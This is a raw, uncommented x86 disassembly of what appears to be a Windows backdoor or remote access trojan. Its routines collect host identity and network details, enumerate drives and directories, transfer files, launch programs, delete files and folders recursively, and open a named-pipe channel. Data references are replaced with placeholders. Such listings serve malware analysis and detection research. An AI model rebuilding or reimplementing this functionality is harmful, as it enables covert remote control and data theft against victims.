call [ CreateThread@IAT ]
retn
cmp eax 0x2000
jne r-xdata
push 0x0
push 0x0
push 0x0
push sub_405b60
push 0x0
push 0x0
call [ CreateThread@IAT ]
cmp eax 0x4000
jne r-xdata
push 0x0
push 0x0
push 0x0
push sub_405b10
push 0x0
push 0x0
call [ CreateThread@IAT ]
retn
sub eax 0x3009
je r-xdata
push 0x104
push 0x0
push rw-data
call sub_411230
push [ rw-data ]
push rw-data
push rw-data
call sub_4117a0
add esp 0x18
push 0x0
push 0x0
push 0x0
push sub_405220
push 0x0
push 0x0
call [ CreateThread@IAT ]
retn
sub eax 0x2
jne r-xdata
retn
push 0x0
push 0x0
push 0x0
push sub_404d80
push 0x0
push 0x0
call [ CreateThread@IAT ]
retn
push 0x0
push 0x0
push 0x0
push sub_405ca0
push 0x0
push 0x0
call [ CreateThread@IAT ]
retn
push 0x0
push 0x0
push 0x0
push sub_405410
push 0x0
push 0x0
call [ CreateThread@IAT ]
retn
sub eax 0x4
jne r-xdata
push eax
push eax
push eax
push sub_4056d0
push eax
push eax
mov [ rw-data ] 0x1
call [ CreateThread@IAT ]
retn
push eax
push eax
push eax
push sub_405ab0
push eax
push eax
call [ CreateThread@IAT ]
retn
sub_404ae0
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax 0xf3d8
call sub_429c10
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xf3d4 ] eax
push esi
push edi
lea ecx [ esp + 0xf018 ]
call sub_404c20
push 0xf010
lea eax [ esp + 0xc ]
push 0x0
push eax
call sub_411230
mov eax [ rw-data ]
lea esi [ esp + 0xf024 ]
mov [ esp + 0x18 ] eax
lea edi [ esp + 0x22 ]
mov ax [ rw-data ]
mov ecx 0xf0
mov [ esp + 0x14 ] 0x1003
add esp 0xc
mov [ esp + 0x10 ] ax
mov edx 0x3ce
mov [ esp + 0x12 ] 0x3c0
[ edi ] [ esi ]
lea ecx [ esp + 0x8 ]
call sub_404820
mov ecx [ esp + 0xf3dc ]
pop edi
pop esi
xor ecx esp
call sub_40d56a
mov esp ebp
pop ebp
retn
sub_404b80
push ebp
mov ebp esp
push ecx
push esi
push 0x288
call sub_40d5ac
push 0x288
mov esi eax
push 0x0
push esi
call sub_411230
add esp 0x10
mov [ ebp - 0x4 ] 0x288
lea eax [ ebp - 0x4 ]
push eax
push esi
call [ GetAdaptersInfo@IAT ]
cmp eax 0x6f
jne r-xdata
test eax eax
je r-xdata
push 0x288
push esi
call sub_40d57b
push [ ebp - 0x4 ]
call sub_40d84f
add esp 0xc
mov esi eax
lea eax [ ebp - 0x4 ]
push eax
push esi
call [ GetAdaptersInfo@IAT ]
xorps xmm0 xmm0
movq [ rw-data ] xmm0
mov eax [ esi + 0x194 ]
mov [ rw-data ] eax
mov ax [ esi + 0x198 ]
push 0x288
push esi
mov [ rw-data ] ax
call sub_40d57b
add esp 0x8
mov al 0x1
pop esi
mov esp ebp
pop ebp
retn
xor al al
pop esi
mov esp ebp
pop ebp
retn
sub_404c20
push ebp
mov ebp esp
sub esp 0x3a4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
push 0x3c0
mov ebx ecx
push 0x0
push ebx
call sub_411230
add esp 0xc
mov [ ebx ] 0x3
lea eax [ ebx + 0x4 ]
mov [ eax ] 0x11c
push eax
call [ GetVersionExW@IAT ]
movups xmm0 [ r--data ]
push 0x200
lea eax [ ebp - 0x208 ]
movups [ ebx + 0x32c ] xmm0
push 0x0
movups xmm0 [ r--data ]
push eax
movups [ ebx + 0x33c ] xmm0
movq xmm0 [ r--data ]
movq [ ebx + 0x34c ] xmm0
call sub_411230
add esp 0xc
mov [ ebp - 0x39c ] 0x100
lea eax [ ebp - 0x39c ]
push eax
lea eax [ ebp - 0x208 ]
push eax
call [ GetComputerNameW@IAT ]
cmp eax 0x1
je r-xdata
lea eax [ ebp - 0x398 ]
push eax
push 0x101
call [ WSAStartup@IAT ]
push r--data
call [ gethostbyname@IAT ]
mov esi eax
mov ecx [ esi + 0xc ]
mov ecx [ ecx ]
push [ ecx ]
call [ inet_ntoa@IAT ]
call [ WSACleanup@IAT ]
mov eax [ esi + 0xc ]
lea edi [ ebx + 0x124 ]
mov ecx 0x82
lea esi [ ebp - 0x208 ]
mov eax [ eax ]
mov eax [ eax ]
[ edi ] [ esi ]
mov [ ebx + 0x120 ] eax
call [ GetACP@IAT ]
mov [ ebx + 0x3bc ] eax
lea eax [ ebp - 0x3a0 ]
push eax
lea eax [ ebx + 0x358 ]
mov [ ebx + 0x354 ] 0x10
push eax
mov [ ebp - 0x3a0 ] 0x32
call [ GetUserNameW@IAT ]
mov ecx [ ebp - 0x4 ]
xor eax eax
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40d56a
mov esp ebp
pop ebp
retn
movq xmm0 [ r--data ]
mov eax [ r--data ]
movq [ ebp - 0x208 ] xmm0
mov [ ebp - 0x200 ] eax
sub_404d80
push ebp
mov ebp esp
mov eax 0xf220
call sub_429c10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
lea ecx [ ebp - 0x210 ]
call sub_404e20
push 0xf010
lea eax [ ebp - 0xf220 ]
push 0x0
push eax
call sub_411230
mov eax [ rw-data ]
lea esi [ ebp - 0x210 ]
mov [ ebp - 0xf21c ] eax
lea edi [ ebp - 0xf212 ]
mov ax [ rw-data ]
mov ecx 0x83
mov [ ebp - 0xf220 ] 0x2001
add esp 0xc
mov [ ebp - 0xf218 ] ax
mov edx 0x21a
mov [ ebp - 0xf216 ] 0x20c
[ edi ] [ esi ]
lea ecx [ ebp - 0xf220 ]
call sub_404820
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40d56a
mov esp ebp
pop ebp
retn
sub_404e20
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x284
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x280 ] eax
push ebx
push esi
push edi
push 0x208
xor ebx ebx
lea eax [ esp + 0x84 ]
mov edi ecx
push ebx
push eax
mov [ esp + 0x1c ] edi
call sub_411230
add esp 0xc
lea eax [ esp + 0x80 ]
push eax
push 0x104
call [ GetLogicalDriveStringsW@IAT ]
lea esi [ esp + 0x80 ]
cmp [ esp + 0x80 ] bx
je r-xdata
lea eax [ esp + 0x40 ]
mov [ edi ] ebx
push eax
mov [ esp + 0x44 ] 0x40
call [ GlobalMemoryStatusEx@IAT ]
mov edx [ esp + 0x4c ]
mov ecx [ esp + 0x48 ]
call sub_42a3e0
mov ebx [ RegOpenKeyExW@IAT ]
lea eax [ esp + 0xc ]
xorps xmm1 xmm1
cvtsd2ss xmm1 xmm0
push eax
push 0x20019
push 0x0
push r--data
movss xmm0 [ r--data ]
mulss xmm1 xmm0
push 0x80000002
mulss xmm1 xmm0
mulss xmm1 xmm0
movss [ edi + 0x4 ] xmm1
call ebx
test eax eax
je r-xdata
nop
push 0x200
lea esi [ edi + 0x8 ]
mov [ esp + 0x20 ] 0x1
push 0x0
push esi
mov [ esp + 0x24 ] 0x100
call sub_411230
add esp 0xc
lea eax [ esp + 0x18 ]
push eax
push esi
mov esi [ RegQueryValueExW@IAT ]
lea eax [ esp + 0x24 ]
push eax
push 0x0
push r--data
push [ esp + 0x20 ]
call esi
test eax eax
jne r-xdata
xor al al
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x280 ]
xor ecx esp
call sub_40d56a
mov esp ebp
pop ebp
retn
mov edi [ esp + 0x10 ]
lea eax [ esp + 0x30 ]
xor edi edi
push eax
lea eax [ esp + 0x2c ]
push eax
lea eax [ esp + 0x40 ]
push eax
push esi
call [ GetDiskFreeSpaceExW@IAT ]
test eax eax
je r-xdata
push [ esp + 0xc ]
mov edi [ RegCloseKey@IAT ]
call edi
lea eax [ esp + 0x14 ]
mov [ esp + 0x24 ] 0x4
push eax
push 0x20019
push 0x0
push r--data
push 0x80000002
mov [ esp + 0x34 ] 0x4
call ebx
test eax eax
jne r-xdata
add esi 0x8
add ebx edi
cmp [ esi ] 0x0
jne r-xdata
mov edi [ esp + 0x28 ]
mov eax [ esp + 0x2c ]
shrd edi eax 0x1e
shr eax 0x1e
lea eax [ esp + 0x20 ]
push eax
mov eax [ esp + 0x14 ]
add eax 0x208
push eax
lea eax [ esp + 0x2c ]
push eax
push 0x0
push r--data
push [ esp + 0x28 ]
call esi
push [ esp + 0x14 ]
mov esi eax
call edi
mov ecx [ esp + 0x28c ]
test esi esi
pop edi
pop esi
sete al
pop ebx
xor ecx esp
call sub_40d56a
mov esp ebp
pop ebp
retn
movzx eax [ esi ]
add eax 0x1
je r-xdata
sub_405010
push ebp
mov ebp esp
mov eax 0xfee4
call sub_429c10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push 0x400
lea eax [ ebp - 0xc0c ]
push 0x0
push eax
call sub_411230
add esp 0xc
lea eax [ ebp - 0x204 ]
push eax
push 0x200
call [ GetLogicalDriveStringsW@IAT ]
xor ebx ebx
lea esi [ ebp - 0x204 ]
xorps xmm0 xmm0
mov [ ebp - 0xfed4 ] ebx
movlpd [ ebp - 0xfedc ] xmm0
movlpd [ ebp - 0xfee4 ] xmm0
cmp [ ebp - 0x204 ] bx
je r-xdata
push 0xf010
lea eax [ ebp - 0xfc1c ]
push 0x0
push eax
call sub_411230
mov eax [ rw-data ]
mov [ ebp - 0xfc18 ] eax
mov ax [ rw-data ]
mov [ ebp - 0xfc14 ] ax
lea eax [ ebx + ebx ]
push eax
lea eax [ ebp - 0xc0c ]
mov [ ebp - 0xfc1c ] 0x3001
push eax
lea eax [ ebp - 0xfc0e ]
mov [ ebp - 0xfc12 ] ebx
push eax
call sub_4117a0
add esp 0x18
lea edx [ ebx * 2 + 0xe ]
lea ecx [ ebp - 0xfc1c ]
call sub_404820
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_40d56a
mov esp ebp
pop ebp
retn
push edi
xor edi edi
xor ebx ebx
cmp eax 0x42
je r-xdata
push 0x208
lea eax [ ebp - 0x40c ]
push 0x0
push eax
call sub_411230
add esp 0xc
lea eax [ ebp - 0x40c ]
push 0x104
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call [ GetVolumeInformationW@IAT ]
push 0x410
push 0x2b4
lea eax [ ebp - 0xfed0 ]
push eax
push 0x80
push esi
call [ SHGetFileInfoW@IAT ]
movzx eax [ esi ]
cmp eax 0x41
je r-xdata
mov ebx [ ebp - 0xfed4 ]
pop edi
push 0x0
lea eax [ ebp - 0xfedc ]
push eax
lea eax [ ebp - 0xfee4 ]
push eax
push esi
call [ GetDiskFreeSpaceExW@IAT ]
test eax eax
je r-xdata
mov edi [ ebp - 0xfedc ]
mov eax [ ebp - 0xfed8 ]
mov ebx [ ebp - 0xfee4 ]
shrd edi eax 0x14
shr eax 0x14
mov eax [ ebp - 0xfee0 ]
shrd ebx eax 0x14
shr eax 0x14
jmp r-xdata
mov ecx [ ebp - 0xfed4 ]
mov ax [ esi ]
push esi
mov [ ebp + ecx * 2 - 0xc0c ] ax
call [ GetDriveTypeW@IAT ]
mov ecx [ ebp - 0xfed4 ]
movups xmm0 [ ebp - 0xfcbc ]
push esi
mov [ ebp + ecx * 2 - 0xc0a ] ax
mov eax [ ebp - 0xfcac ]
mov [ ebp + ecx * 2 - 0xc08 ] edi
mov [ ebp + ecx * 2 - 0xc00 ] ebx
movups [ ebp + ecx * 2 - 0xbf8 ] xmm0
mov [ ebp + ecx * 2 - 0xbe8 ] eax
add ecx 0x1e
mov [ ebp - 0xfed4 ] ecx
call [ lstrlenW@IAT ]
lea esi [ esi + eax * 2 ]
add esi 0x2
cmp [ esi ] 0x0
jne r-xdata
sub_405220
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x464
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x460 ] eax
push ebx
push esi
push edi
push 0xc800
push 0x40
call [ LocalAlloc@IAT ]
push rw-data
mov ebx eax
lea eax [ esp + 0x264 ]
push r--data
push eax
call [ wsprintfW@IAT ]
add esp 0xc
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x264 ]
push eax
call [ FindFirstFileW@IAT ]
mov esi eax
mov [ esp + 0xc ] esi
cmp esi 0xffffffff
jne r-xdata
mov edi 0xe
nop [ eax + eax ] ax
mov [ ebx ] 0x3003
mov edx 0xe
mov eax [ rw-data ]
mov ecx ebx
mov [ ebx + 0x4 ] eax
mov ax [ rw-data ]
mov [ ebx + 0x8 ] ax
mov [ ebx + 0xa ] 0x0
call sub_404820
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x460 ]
xor ecx esp
call sub_40d56a
mov esp ebp
pop ebp
retn
mov [ ebx ] 0x3003
lea edx [ edi + 0xe ]
mov eax [ rw-data ]
mov ecx ebx
mov [ ebx + 0x4 ] eax
mov ax [ rw-data ]
mov [ ebx + 0x8 ] ax
mov [ ebx + 0xa ] edi
call sub_404820
push ebx
call [ LocalFree@IAT ]
push esi
call [ FindClose@IAT ]
mov ecx [ esp + 0x46c ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_40d56a
mov esp ebp
pop ebp
retn
mov ecx r--data
lea eax [ esp + 0x3c ]
sbb eax eax
or eax 0x1
test dx dx
je r-xdata
lea eax [ esp + 0x10 ]
push eax
push esi
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
mov eax r--data
lea ecx [ esp + 0x3c ]
xor eax eax
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
cmp edi 0xc3f0
ja r-xdata
sbb eax eax
or eax 0x1
test dx dx
je r-xdata
test eax eax
je r-xdata
add eax 0x4
add ecx 0x4
test dx dx
jne r-xdata
mov al [ esp + 0x10 ]
and al 0x10
mov [ ebx + edi ] al
lea eax [ esp + 0x3c ]
push eax
add edi 0x2
call [ lstrlenW@IAT ]
mov esi eax
lea ecx [ ebx + edi ]
add esi esi
lea eax [ esp + 0x3c ]
push esi
push eax
push ecx
call sub_4117a0
add edi esi
add esp 0xc
mov esi [ esp + 0xc ]
mov [ ebx + edi ] 0x0
mov eax [ esp + 0x2c ]
mov [ ebx + edi + 0x2 ] eax
mov eax [ esp + 0x30 ]
mov [ ebx + edi + 0xa ] eax
mov eax [ esp + 0x24 ]
mov [ ebx + edi + 0x12 ] eax
mov eax [ esp + 0x28 ]
mov [ ebx + edi + 0x16 ] eax
add edi 0x22
xor eax eax
jmp r-xdata
mov dx [ ecx + 0x2 ]
cmp dx [ eax + 0x2 ]
jne r-xdata
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
test eax eax
je r-xdata
add ecx 0x4
add eax 0x4
test dx dx
jne r-xdata
mov dx [ ecx ]
cmp dx [ eax ]
jne r-xdata
sub_405410
push ebp
mov ebp esp
sub esp 0x224
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push 0xf010
push rw-data
push rw-data
call sub_4117a0
push 0x208
lea eax [ ebp - 0x20c ]
push 0x0
push eax
call sub_411230
mov eax [ rw-data ]
add eax 0xfffffff8
push eax
lea eax [ ebp - 0x20c ]
push rw-data
push eax
call sub_4117a0
add esp 0x24
lea eax [ ebp - 0x20c ]
push 0x0
push 0x0
push 0x4
push 0x0
push 0x1
push 0x40000000
push eax
call [ CreateFileW@IAT ]
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
push esi
push edi
mov edi [ GetLastError@IAT ]
call edi
mov ecx [ rw-data ]
xorps xmm0 xmm0
movups [ ebp - 0x21f ] xmm0
mov [ ebp - 0x21c ] ecx
mov edx 0x12
mov cx [ rw-data ]
mov [ ebp - 0x218 ] cx
lea ecx [ ebp - 0x220 ]
mov [ ebp - 0x20f ] 0x0
mov [ ebp - 0x220 ] 0x300a
mov [ ebp - 0x216 ] 0x4
mov [ ebp - 0x212 ] eax
call sub_404820
push [ rw-data ]
mov esi eax
call [ ResetEvent@IAT ]
test esi esi
jne r-xdata
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
xorps xmm0 xmm0
movups [ ebp - 0x21f ] xmm0
mov [ ebp - 0x21c ] ecx
mov edx 0x12
mov cx [ rw-data ]
mov [ ebp - 0x218 ] cx
lea ecx [ ebp - 0x220 ]
mov [ ebp - 0x20f ] 0x0
mov [ ebp - 0x220 ] 0x3101
mov [ ebp - 0x216 ] 0x4
mov [ ebp - 0x212 ] eax
call sub_404820
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40d56a
mov esp ebp
pop ebp
retn
push ebx
call [ SetEndOfFile@IAT ]
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
mov [ ebp - 0x224 ] esi
je r-xdata
push ebx
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
call edi
nop [ eax ] eax
push ebx
call [ CloseHandle@IAT ]
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40d56a
mov esp ebp
pop ebp
retn
call edi
push 0x32
call [ Sleep@IAT ]
push 0xf010
push 0x0
push rw-data
call sub_411230
add esp 0xc
push rw-data
call [ EnterCriticalSection@IAT ]
lea eax [ ebp - 0x21c ]
push eax
call sub_406ee0
mov esi [ eax ]
test esi esi
je r-xdata
cmp [ rw-data ] 0x0
jbe r-xdata
jmp r-xdata
mov edx [ eax + 0x8 ]
mov ecx edx
mov eax [ esi + 0x8 ]
and edx 0x3
dec eax
shr ecx 0x2
and ecx eax
mov eax [ esi + 0x4 ]
mov eax [ eax + ecx * 4 ]
mov esi [ eax + edx * 4 ]
sub [ rw-data ] 0x1
jne r-xdata
mov esi [ esi ]
mov edi [ GetLastError@IAT ]
inc [ rw-data ]
mov [ rw-data ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push 0xf010
push esi
push rw-data
call sub_4117a0
mov eax [ rw-data ]
add esp 0xc
cmp eax 0x300c
je r-xdata
push rw-data
call [ LeaveCriticalSection@IAT ]
test esi esi
je r-xdata
push 0x1
push esi
call sub_40d57b
add esp 0x8
cmp eax 0x300b
jne r-xdata
mov edi [ rw-data ]
lea eax [ ebp - 0x224 ]
push 0x0
push eax
push edi
push rw-data
push ebx
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edi [ GetLastError@IAT ]
call edi
push 0x1
push esi
call sub_40d57b
add esp 0x8
jmp r-xdata
cmp edi [ ebp - 0x224 ]
jne r-xdata
push 0x1
push esi
call sub_40d57b
add esp 0x8
jmp r-xdata
sub_4056d0
push ebp
mov ebp esp
mov eax 0xf234
call sub_429c10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
push 0xf010
lea eax [ ebp - 0xf21c ]
push rw-data
push eax
call sub_4117a0
push 0x208
lea eax [ ebp - 0x20c ]
mov ebx 0x1
push 0x0
push eax
call sub_411230
push [ ebp - 0xf212 ]
lea eax [ ebp - 0xf20e ]
push eax
lea eax [ ebp - 0x20c ]
push eax
call sub_4117a0
push 0xf010
lea eax [ ebp - 0xf21c ]
push 0x0
push eax
call sub_411230
add esp 0x30
lea eax [ ebp - 0x20c ]
push 0x0
push 0x0
push 0x3
push 0x0
push ebx
push 0x80000000
push eax
call [ CreateFileW@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
lea eax [ ebp - 0xf1fc ]
push eax
lea eax [ ebp - 0xf204 ]
push eax
lea eax [ ebp - 0xf20c ]
push eax
push edi
call [ GetFileTime@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
lea edx [ ebx + 0x11 ]
xorps xmm0 xmm0
mov [ ebp - 0xf21f ] 0x0
movups [ ebp - 0xf22f ] xmm0
mov [ ebp - 0xf22c ] ecx
mov cx [ rw-data ]
mov [ ebp - 0xf228 ] cx
lea ecx [ ebp - 0xf230 ]
mov [ ebp - 0xf230 ] 0x3101
mov [ ebp - 0xf226 ] 0x4
mov [ ebp - 0xf222 ] eax
call sub_404820
pop edi
mov [ rw-data ] 0x0
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40d56a
mov esp ebp
pop ebp
retn
push esi
lea eax [ ebp - 0xf1e4 ]
push eax
push edi
call [ GetFileSize@IAT ]
mov esi [ GetLastError@IAT ]
mov [ ebp - 0xf1e8 ] eax
cmp eax 0xffffffff
jne r-xdata
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
xorps xmm0 xmm0
movups [ ebp - 0xf22f ] xmm0
mov [ ebp - 0xf22c ] ecx
mov cx [ rw-data ]
mov [ ebp - 0xf21f ] 0x0
push edi
mov [ ebp - 0xf230 ] 0x3101
mov [ ebp - 0xf228 ] cx
mov [ ebp - 0xf226 ] 0x4
mov [ ebp - 0xf222 ] eax
call [ CloseHandle@IAT ]
mov edx 0x12
lea ecx [ ebp - 0xf230 ]
call sub_404820
pop edi
mov [ rw-data ] 0x0
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40d56a
mov esp ebp
pop ebp
retn
push 0x0
push 0x0
push 0x0
push edi
mov [ ebp - 0xf1f4 ] ebx
call [ SetFilePointer@IAT ]
mov [ ebp - 0xf1f0 ] eax
cmp eax 0xffffffff
jne r-xdata
call esi
test eax eax
jne r-xdata
mov eax [ rw-data ]
lea ecx [ ebp - 0xf21c ]
mov [ ebp - 0xf218 ] eax
mov edx 0x3c
mov ax [ rw-data ]
mov [ ebp - 0xf21c ] 0x3005
mov [ ebp - 0xf214 ] ax
mov [ ebp - 0xf212 ] 0x2e
call sub_404820
test eax eax
je r-xdata
call esi
mov edx eax
test edx edx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
pop edi
xor ecx ebp
pop ebx
call sub_40d56a
mov esp ebp
pop ebp
retn
cmp [ rw-data ] 0x0
mov [ ebp - 0xf234 ] 0x0
je r-xdata
push edi
call [ CloseHandle@IAT ]
jmp r-xdata
mov ax [ rw-data ]
xorps xmm0 xmm0
mov ecx [ rw-data ]
movups [ ebp - 0xf22f ] xmm0
mov [ ebp - 0xf21f ] 0x0
push edi
mov [ ebp - 0xf230 ] 0x3101
mov [ ebp - 0xf22c ] ecx
mov [ ebp - 0xf228 ] ax
mov [ ebp - 0xf226 ] 0x4
mov [ ebp - 0xf222 ] edx
call [ CloseHandle@IAT ]
jmp r-xdata
push edi
call [ CloseHandle@IAT ]
push 0x0
lea eax [ ebp - 0xf234 ]
push eax
push 0x4000
lea eax [ ebp - 0xf20a ]
push eax
push edi
call [ ReadFile@IAT ]
mov esi eax
test esi esi
je r-xdata
mov [ rw-data ] 0x0
lea ecx [ ebp - 0xf230 ]
call [ GetLastError@IAT ]
mov ebx [ CloseHandle@IAT ]
mov esi eax
push edi
call ebx
mov ax [ rw-data ]
xorps xmm0 xmm0
mov ecx [ rw-data ]
movups [ ebp - 0xf22f ] xmm0
mov [ ebp - 0xf21f ] 0x0
push edi
mov [ ebp - 0xf230 ] 0x3101
mov [ ebp - 0xf22c ] ecx
mov [ ebp - 0xf228 ] ax
mov [ ebp - 0xf226 ] 0x4
mov [ ebp - 0xf222 ] esi
call ebx
mov edx [ ebp - 0xf234 ]
test edx edx
je r-xdata
push edi
call [ CloseHandle@IAT ]
mov eax [ rw-data ]
lea ecx [ ebp - 0xf21c ]
mov [ ebp - 0xf218 ] eax
mov ax [ rw-data ]
mov [ ebp - 0xf21c ] 0x3007
mov [ ebp - 0xf214 ] ax
mov [ ebp - 0xf212 ] esi
jmp r-xdata
mov eax [ rw-data ]
lea ecx [ ebp - 0xf21c ]
mov [ ebp - 0xf218 ] eax
mov ax [ rw-data ]
mov [ ebp - 0xf212 ] edx
add edx 0x12
mov [ ebp - 0xf20e ] ebx
inc ebx
mov [ ebp - 0xf21c ] 0x3006
mov [ ebp - 0xf214 ] ax
call sub_404820
test eax eax
jne r-xdata
mov edx 0x12
call sub_404820
cmp [ rw-data ] al
jne r-xdata
sub_405ab0
push ebp
mov ebp esp
sub esp 0x20c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push [ rw-data ]
lea eax [ ebp - 0x20c ]
push rw-data
push eax
call sub_4117a0
add esp 0xc
lea eax [ ebp - 0x20c ]
push 0x0
push 0x0
push 0x0
push eax
push r--data
push 0x0
call [ ShellExecuteW@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40d56a
mov esp ebp
pop ebp
retn
sub_405b10
push ebp
mov ebp esp
sub esp 0x20c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push [ rw-data ]
lea eax [ ebp - 0x20c ]
push rw-data
push eax
call sub_4117a0
add esp 0xc
lea eax [ ebp - 0x20c ]
push eax
call [ DeleteFileW@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40d56a
mov esp ebp
pop ebp
retn
sub_405ba0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x66c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x668 ] eax
push ebx
push esi
push edi
mov edi [ wsprintfW@IAT ]
lea eax [ esp + 0x468 ]
mov esi ecx
push esi
push r--data
push eax
call edi
add esp 0xc
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x46c ]
push eax
call [ FindFirstFileW@IAT ]
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
cmp [ esp + 0x3c ] 0x2e
je r-xdata
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x668 ]
xor ecx esp
call sub_40d56a
mov esp ebp
pop ebp
retn
lea eax [ esp + 0x10 ]
push eax
push ebx
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
test [ esp + 0x10 ] 0x10
lea eax [ esp + 0x3c ]
push eax
push esi
lea eax [ esp + 0x268 ]
push r--data
push eax
je r-xdata
push ebx
call [ FindClose@IAT ]
push esi
call [ RemoveDirectoryW@IAT ]
mov ecx [ esp + 0x674 ]
neg eax
pop edi
pop esi
sbb eax eax
pop ebx
xor ecx esp
neg eax
call sub_40d56a
mov esp ebp
pop ebp
retn
call edi
add esp 0x10
lea eax [ esp + 0x260 ]
push eax
call [ DeleteFileW@IAT ]
call edi
add esp 0x10
lea ecx [ esp + 0x260 ]
call sub_405ba0
jmp r-xdata
sub_405ca0
push ebx
mov ebx esp
sub esp 0x8
and esp 0xfffffff0
add esp 0x4
push ebp
mov ebp [ ebx + 0x4 ]
mov [ esp + 0x4 ] ebp
mov ebp esp
sub esp 0x238
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ CreateEventW@IAT ]
push edi
push 0x0
push 0x0
push 0x1
push 0x0
call esi
mov [ ebp - 0xfc ] eax
xorps xmm0 xmm0
lea eax [ ebp - 0x114 ]
movq [ ebp - 0x114 ] xmm0
push eax
push 0x0
push 0x1000
push 0x1000
push 0xff
push 0x0
push 0x40000003
mov [ ebp - 0x10c ] 0x0
push r--data
mov [ ebp - 0x114 ] 0xc
mov [ ebp - 0x10c ] 0x1
call [ CreateNamedPipeW@IAT ]
mov edi eax
mov [ ebp - 0x104 ] edi
cmp edi 0xffffffff
jne r-xdata
push 0x0
push 0x0
push 0x1
xorps xmm0 xmm0
mov [ ebp - 0x140 ] 0x0
push 0x0
movaps [ ebp - 0x150 ] xmm0
call esi
mov [ ebp - 0x140 ] eax
lea eax [ ebp - 0x150 ]
push eax
push edi
call [ ConnectNamedPipe@IAT ]
mov esi [ GetLastError@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
xorps xmm0 xmm0
movups [ ebp - 0xef ] xmm0
mov [ ebp - 0xec ] ecx
mov cx [ rw-data ]
mov [ ebp - 0xdf ] 0x0
mov [ ebp - 0xe8 ] cx
mov [ ebp - 0xe2 ] eax
push 0x0
push 0x40000000
push 0x3
lea eax [ ebp - 0x114 ]
push eax
push 0x0
push 0xc0000000
push r--data
call [ CreateFileW@IAT ]
mov [ ebp - 0xf4 ] eax
cmp eax 0xffffffff
jne r-xdata
call esi
mov edx eax
cmp edx 0x3e5
je r-xdata
mov eax [ ebp - 0x130 ]
mov esi [ CloseHandle@IAT ]
test eax eax
je r-xdata
push 0x0
lea eax [ ebp - 0x118 ]
mov [ ebp - 0x118 ] 0x0
push eax
lea eax [ ebp - 0x150 ]
push eax
push edi
call [ GetOverlappedResult@IAT ]
test eax eax
jne r-xdata
call esi
mov ecx [ rw-data ]
xorps xmm0 xmm0
movups [ ebp - 0xef ] xmm0
mov [ ebp - 0xec ] ecx
mov edx 0x12
mov cx [ rw-data ]
mov [ ebp - 0xe8 ] cx
lea ecx [ ebp - 0xf0 ]
mov [ ebp - 0xdf ] 0x0
mov [ ebp - 0xf0 ] 0x4001
mov [ ebp - 0xe6 ] 0x4
mov [ ebp - 0xe2 ] eax
call sub_404820
mov edi [ ebp - 0xf4 ]
jmp r-xdata
mov ax [ rw-data ]
xorps xmm0 xmm0
mov ecx [ rw-data ]
movups [ ebp - 0xef ] xmm0
mov [ ebp - 0xdf ] 0x0
mov [ ebp - 0xec ] ecx
mov [ ebp - 0xe8 ] ax
mov [ ebp - 0xe2 ] edx
jmp r-xdata
mov eax [ ebp - 0x140 ]
test eax eax
je r-xdata
push 0x0
push eax
call [ TerminateProcess@IAT ]
push [ ebp - 0x130 ]
call esi
lea eax [ ebp - 0x114 ]
push eax
push 0x0
push 0x1000
push 0x1000
push 0xff
push 0x0
push 0x40000003
push r--data
call [ CreateNamedPipeW@IAT ]
mov edi eax
mov [ ebp - 0x100 ] edi
cmp edi 0xffffffff
jne r-xdata
call esi
mov ecx [ rw-data ]
xorps xmm0 xmm0
